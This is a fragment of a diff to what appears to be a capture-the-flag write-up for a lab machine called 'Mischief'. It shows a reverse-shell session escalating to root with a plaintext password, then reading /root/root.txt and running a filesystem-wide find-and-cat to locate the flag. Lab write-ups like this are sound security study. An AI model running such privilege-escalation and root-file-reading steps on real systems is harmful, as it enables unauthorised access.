@@ -229,10 +229,6 @@ AND BIM REVERSE SHELL ! :D
     www-data@Mischief:/var/www/html$ su - root
     su - root
     Password: lokipasswordmischieftrickery
-
-    root@Mischief:~# wc -l /root/root.txt
-    wc -l /root/root.txt
-    1 /root/root.txt
     root@Mischief:~# cat /root/root.txt
     The flag is not here, get a shell to find it!
     root@Mischief:~# find / -type f -name "root.txt" -exec cat {} \; -print 2>/dev/null
